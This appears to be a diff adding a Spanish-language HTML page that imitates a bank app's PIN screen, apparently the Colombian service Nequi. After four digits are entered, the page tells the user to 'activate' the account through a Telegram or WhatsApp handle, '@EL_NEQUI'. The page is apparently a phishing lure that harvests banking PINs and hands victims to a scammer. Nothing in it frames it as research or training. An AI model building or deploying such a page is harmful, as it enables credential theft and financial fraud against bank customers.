@@ -1,0 +1,210 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pantalla de Clave</title>
+    <style>
+        /* Estilos generales */
+        body {
+            margin: 0;
+            font-family: 'Roboto', Arial, sans-serif;
+            background-color: #390258; /* Fondo morado fuerte y puro */
+            color: #FFFFFF;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+        }
+
+        /* Contenedor principal */
+        .container {
+            text-align: center;
+            width: 90%;
+            max-width: 400px;
+        }
+
+        .title {
+            font-size: 1.5rem;
+            margin-bottom: 20px;
+        }
+
+        .pin-container {
+            display: flex;
+            justify-content: space-between;
+            gap: 10px;
+            margin-bottom: 20px;
+        }
+
+        .pin-input {
+            width: 60px;
+            height: 60px;
+            border: none;
+            border-radius: 8px;
+            background-color: #FFFFFF;
+            color: #000000;
+            font-size: 2rem;
+            text-align: center;
+            box-shadow: 0px 2px 5px rgba(0, 0, 0, 0.3);
+        }
+
+        .pin-input:focus {
+            outline: 2px solid #FF0066;
+        }
+
+        .hint {
+            margin-top: 15px;
+            font-size: 0.9rem;
+            color: #BBA8C1;
+        }
+
+        .button-container {
+            margin-top: 30px;
+        }
+
+        .num-pad {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 10px;
+            margin-top: 20px;
+        }
+
+        .num-button {
+            width: 80px;
+            height: 80px;
+            background-color: #FFFFFF;
+            color: #000000;
+            border: none;
+            border-radius: 50%;
+            font-size: 1.5rem;
+            cursor: pointer;
+            box-shadow: 0px 3px 6px rgba(0, 0, 0, 0.3);
+            transition: background-color 0.3s;
+        }
+
+        .num-button:hover {
+            background-color: #FF0066;
+            color: #FFFFFF;
+        }
+
+        button {
+            width: 100%;
+            padding: 15px;
+            background-color: #FF0066;
+            color: #FFFFFF;
+            border: none;
+            border-radius: 10px;
+            font-size: 1.2rem;
+            cursor: pointer;
+            box-shadow: 0px 3px 6px rgba(0, 0, 0, 0.3);
+            transition: background-color 0.3s;
+        }
+
+        button:hover {
+            background-color: #E6005C;
+        }
+
+        .message {
+            margin-top: 20px;
+            font-size: 1rem;
+            color: #FFFFFF;
+            background-color: #FF0066;
+            padding: 10px;
+            border-radius: 8px;
+            box-shadow: 0px 2px 5px rgba(0, 0, 0, 0.3);
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="title">Ingresa tu clave</div>
+
+        <div class="pin-container">
+            <input class="pin-input" type="password" maxlength="1" inputmode="numeric" />
+            <input class="pin-input" type="password" maxlength="1" inputmode="numeric" />
+            <input class="pin-input" type="password" maxlength="1" inputmode="numeric" />
+            <input class="pin-input" type="password" maxlength="1" inputmode="numeric" />
+        </div>
+
+        <div class="num-pad">
+            <button class="num-button" onclick="addDigit(1)">1</button>
+            <button class="num-button" onclick="addDigit(2)">2</button>
+            <button class="num-button" onclick="addDigit(3)">3</button>
+            <button class="num-button" onclick="addDigit(4)">4</button>
+            <button class="num-button" onclick="addDigit(5)">5</button>
+            <button class="num-button" onclick="addDigit(6)">6</button>
+            <button class="num-button" onclick="addDigit(7)">7</button>
+            <button class="num-button" onclick="addDigit(8)">8</button>
+            <button class="num-button" onclick="addDigit(9)">9</button>
+            <button class="num-button" onclick="deleteDigit()">⌫</button>
+            <button class="num-button" onclick="addDigit(0)">0</button>
+        </div>
+
+        <div class="hint">Por tu seguridad, tu clave estará protegida.</div>
+
+        <div class="button-container">
+            <button>Continuar</button>
+        </div>
+
+        <div class="message" id="activationMessage">
+            Debes activar tu cuenta con <strong>@EL_NEQUI</strong> en Telegram o WhatsApp.
+        </div>
+    </div>
+
+    <script>
+        const pinInputs = document.querySelectorAll('.pin-input');
+        const activationMessage = document.getElementById('activationMessage');
+        let currentInputIndex = 0;
+
+        function addDigit(digit) {
+            if (currentInputIndex < pinInputs.length) {
+                pinInputs[currentInputIndex].value = digit;
+                currentInputIndex++;
+
+                if (currentInputIndex === pinInputs.length) {
+                    showActivationMessage();
+                }
+            }
+        }
+
+        function deleteDigit() {
+            if (currentInputIndex > 0) {
+                currentInputIndex--;
+                pinInputs[currentInputIndex].value = '';
+            }
+        }
+
+        function showActivationMessage() {
+            activationMessage.style.display = 'block';
+        }
+
+        pinInputs.forEach((input, index) => {
+            input.addEventListener('input', (event) => {
+                const value = event.target.value;
+
+                // Si el valor ingresado no es un número, lo borra
+                if (!/^[0-9]$/.test(value)) {
+                    event.target.value = '';
+                    return;
+                }
+
+                // Mover el foco al siguiente input
+                if (value && index < pinInputs.length - 1) {
+                    pinInputs[index + 1].focus();
+                } else if (index === pinInputs.length - 1) {
+                    showActivationMessage();
+                }
+            });
+
+            input.addEventListener('keydown', (event) => {
+                // Mover el foco al input anterior si se presiona la tecla de retroceso
+                if (event.key === 'Backspace' && !event.target.value && index > 0) {
+                    pinInputs[index - 1].focus();
+                }
+            });
+        });
+    </script>
+</body>
+</html>
